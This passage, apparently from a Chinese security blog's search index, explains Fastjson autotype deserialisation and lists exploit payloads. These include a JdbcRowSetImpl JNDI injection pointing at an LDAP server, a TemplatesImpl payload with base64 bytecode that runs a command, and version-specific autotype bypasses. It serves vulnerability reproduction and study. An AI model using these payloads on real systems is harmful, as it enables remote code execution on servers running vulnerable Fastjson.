class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;有参构造&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getId&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setId&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JSON.toJSONString(class);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;lihua&quot;</span>,<span class="number">3</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JSON.toJSONString(user);</span><br><span class="line">System.out.println(json);</span><br></pre></td></tr></table></figure><blockquote><p>序列化时会自动调用<code>Getter</code>方法</p></blockquote><p><img src="/../images/image-20230912154025083.png" alt="image-20230912154025083"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;lihua&quot;</span>,<span class="number">3</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">System.out.println(json);</span><br></pre></td></tr></table></figure><blockquote><p>传入<code>SerializerFeature.WriteClassName</code>可以使得Fastjson支持自省，开启自省后序列化成JSON的数据就会多一个@type，这个是代表对象类型的JSON文本。</p></blockquote><p><img src="/../images/image-20230912153839072.png" alt="image-20230912153839072"></p><p><code>@type</code> 指定类，其他为该类<code>Getter</code>方法返回的类属性</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JSON.parse(json) </span><br><span class="line">JSON.parseObject(json,class) </span><br></pre></td></tr></table></figure><p>只有在指定是哪一个类的前提下</p><blockquote><p>使用<code>JSON.parse</code>反序列化会调用此类的set方法</p><p>使用<code>JSON.parseObject</code>反序列化会调用此类的get和set方法</p></blockquote><p><img src="/../images/image-20230912155454575.png" alt="image-20230912155454575"></p><p>如何指定一个类</p><ul><li><p>json中使用@type指定</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;User\&quot;,\&quot;id\&quot;:3,\&quot;name\&quot;:\&quot;lihua\&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230912155538136.png" alt="image-20230912155538136"></p></li><li><p><code>parseObject</code>中的第二个参数指定</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JSON.parseObject(json2, User.class)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230912155631461.png" alt="image-20230912155631461"></p></li></ul><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><h3 id="JdbcRowSetImpl链"><a href="#JdbcRowSetImpl链" class="headerlink" title="JdbcRowSetImpl链"></a>JdbcRowSetImpl链</h3><blockquote><p>本质是JNDI注入，jdk版本需要满足 8u161 &lt; jdk &lt; 8u191</p></blockquote><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/g0tvin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>setDataSourceName</code>方法把传进去的值赋给<code>dataSource</code></p><p><code>setautoCommit</code>方法需要传入一个布尔类型的参数，跟进connect方法，<code>lookup(getDataSourceName())</code> lookup函数链接我们写入的服务 加载我们的恶意类</p></blockquote><h3 id="TemplatesImpl链"><a href="#TemplatesImpl链" class="headerlink" title="TemplatesImpl链"></a>TemplatesImpl链</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;yv66vgAAADQAJAoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAR0ZXN0AQAMSW5uZXJDbGFzc2VzAQAiTGNvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMSR0ZXN0OwEAClNvdXJjZUZpbGUBAAxKREs3dTIxLmphdmEMAAQABQcAEwEAIGNvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMSR0ZXN0AQAQamF2YS9sYW5nL09iamVjdAEAG2NvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMQEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHABUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAXABgKABYAGQEABGNhbGMIABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAdAB4KABYAHwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACEKACIADwAhAAIAIgAAAAAAAgABAAQABQABAAYAAAAvAAEAAQAAAAUqtwAjsQAAAAIABwAAAAYAAQAAACoACAAAAAwAAQAAAAUACQAMAAAACAAUAAUAAQAGAAAAFgACAAAAAAAKuAAaEhy2ACBXsQAAAAAAAgANAAAAAgAOAAsAAAAKAAEAAgAQAAoACQ==&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span>&#x27;_name&#x27;<span class="punctuation">:</span>&#x27;exp&#x27;<span class="punctuation">,</span>&#x27;_tfactory&#x27;<span class="punctuation">:</span><span class="punctuation">&#123;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span> <span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><blockquote><p>Fastjson在不同版本下的利用方式很不同，所以存在Fastjson漏洞时，首要判断Fastjson的版本。</p></blockquote><h4 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h4><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx://xxx/xx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="1-2-25–1-2-47"><a href="#1-2-25–1-2-47" class="headerlink" title="1.2.25–1.2.47"></a>1.2.25–1.2.47</h4><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx://xxx/xxx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="1-2-48–1-2-68"><a href="#1-2-48–1-2-68" class="headerlink" title="1.2.48–1.2.68"></a>1.2.48–1.2.68</h4><h4 id="1-2-80"><a href="#1-2-80" class="headerlink" title="1.2.80"></a>1.2.80</h4><h1 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h1><p><a href="https://mp.weixin.qq.com/s/5mO1L5o8j_m6RYM6nO-pAA">第18篇：fastjson反序列化漏洞区分版本号的方法总结 (qq.com)</a></p><p><a href="https://github.com/safe6Sec/Fastjson">safe6Sec&#x2F;Fastjson: Fastjson姿势技巧集合</a></p><p><a href="https://mp.weixin.qq.com/s/CDKNUdVXOBmqE4mDtg8P_A">Fastjson不出网利用总结 (qq.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
